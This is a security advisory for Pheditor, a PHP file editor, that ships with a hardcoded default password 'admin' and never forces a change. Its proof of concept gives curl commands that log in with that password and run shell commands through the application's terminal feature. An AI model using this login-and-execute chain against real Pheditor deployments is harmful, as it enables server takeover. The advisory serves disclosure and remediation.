# [C] Pheditor: Hardcoded default password 'admin' with no forced change enables full application compromise

## Summary
Severity: Critical
Advisory: GHSA-p4h7-p9rj-2pq2
CVE: CVE-2026-55579
CWE: CWE-798
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-07-16
Source: https://github.com/advisories/GHSA-p4h7-p9rj-2pq2
Type: github-advisory

## Affected
- Packagist: `pheditor/pheditor` — affected >=2.0.1 <2.0.6

## Details
### Summary

Pheditor ships with a hardcoded default password `admin` (SHA-512 hash stored at `pheditor.php:11`). There is no mechanism to force a password change on first login. Any deployment using the default credentials grants an attacker full access to the file editor, file upload, and terminal features, enabling arbitrary file read/write and remote code execution.

### Details

Tested repository: https://github.com/pheditor/pheditor

Tested commit: `e538f05b6faec99e5b23726bc9c17d6b57774297` (current HEAD on `main`)

Affected version: All versions of Pheditor

The password is hardcoded at `pheditor.php:11`:

```php
define('PASSWORD', 'c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec');
```

This is the SHA-512 hash of the string `admin`:
```bash
echo -n 'admin' | sha512sum
c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
```

The application displays a warning banner at `pheditor.php:1956-1958` when the default password is in use, but this is only visual — there is no forced password change, no expiry, no lockout, and no setup wizard. Many deployments run with the default indefinitely.

The password hash is stored as unsalted SHA-512 in the source code. The password change feature (lines 363-391) writes the new hash directly into the PHP source file, meaning anyone with read access to the source can extract it.

**Combined impact:** With the default password, an unauthenticated attacker can authenticate and exploit the terminal RCE and file upload vulnerabilities for immediate server compromise.

### PoC

**Environment:** Any system running Pheditor with default configuration.

**Setup:**
```bash
git clone https://github.com/pheditor/pheditor /tmp/pheditor-test
cd /tmp/pheditor-test
php -S localhost:8080 pheditor.php &
```

**Positive trigger — authenticate with default password:**
```bash
curl -s -c /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  -d "pheditor_password=admin" -L -o /dev/null -w "%{http_code}"
```
Expected: `200` — successful authentication with the default password `admin`.

**Verify full access:**
```bash
TOKEN=$(curl -s -b /tmp/cookies.txt http://localhost:8080/pheditor.php | \
  grep -o 'token = "[a-f0-9]*"' | grep -o '"[a-f0-9]*"' | tr -d '"')
curl -s -b /tmp/cookies.txt -X POST http://localhost:8080/pheditor.php \
  --data-urlencode "action=terminal" \
  --data-urlencode "token=$TOKEN" \
  --data-urlencode 'command=echo `id`' \
  --data-urlencode "dir="
```
Expected: `id` output showing web server user — proves full system access through default credentials combined with terminal RCE.

**Control (wrong password):**
```bash
curl -s -X POST http://localhost:8080/pheditor.php \
  -d "pheditor_password=wrongpassword" | grep -o 'not correct'
```
Expected: `not correct` — authentication logic works but default password is trivially guessable.

**Cleanup:**
```bash
kill %1; rm -rf /tmp/pheditor-test /tmp/cookies.txt
```

### Impact

Use of Hard-coded Credentials (CWE-798). The default password `admin` is publicly documented in the source code, trivially guessable, and there is no mechanism to force a password change on first login. This effectively grants unauthenticated remote attackers full administrator access to the application.

**Attacker privileges:** Unauthenticated remote attacker (PR:N).

**Security boundary crossed:** Unauthenticated → fully authenticated administrator.

**Confidentiality impact:** High — read all files within MAIN_DIR and beyond (via terminal).

**Integrity impact:** High — write/delete files, upload webshells, modify application code, execute arbitrary commands.

**Availability impact:** High — delete files and directories, disrupt services.

**Suggested remediation:**
1. Remove the default password — require user to set a password during installation.
2. Add a setup wizard that forces password creation on first access.
3. Add a forced password change on first login with default credentials.
4. Use `password_hash()` / `password_verify()` with `PASSWORD_BCRYPT` instead of raw SHA-512.

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)

## References
- https://github.com/pheditor/pheditor/security/advisories/GHSA-p4h7-p9rj-2pq2
- https://github.com/pheditor/pheditor
- https://github.com/pheditor/pheditor/releases/tag/2.0.6
